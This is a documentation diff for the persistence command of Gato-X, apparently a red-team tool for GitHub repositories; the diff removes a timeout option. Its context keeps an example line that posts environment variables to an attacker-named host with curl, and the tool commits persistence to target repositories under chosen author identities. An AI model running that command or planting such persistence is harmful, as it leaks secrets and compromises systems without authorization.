@@ -23,7 +23,6 @@ gato-x p [options]
 | `--target`, `-t` | Repository to target for persistence in ORG/REPO format (required) |
 | `--author-name`, `-a` | Name of the author that all git commits will be made under |
 | `--author-email`, `-e` | Email that all git commits will be made under |
-| `--timeout`, `-to` | Timeout in seconds to wait for API calls (default: 30) |
 
 ### Persistence Technique Options
 
@@ -164,7 +163,7 @@ curl -X POST https://attacker.com/exfil -d "$(env)"
 
 - **Admin techniques**: Verify you have admin access to the target repository
 - **Write techniques**: Verify you have write access to the target repository
-- **API limits**: Respect GitHub API rate limits; use `--timeout` to increase wait times
+- **API limits**: Respect GitHub API rate limits
 
 ### Common Issues
 
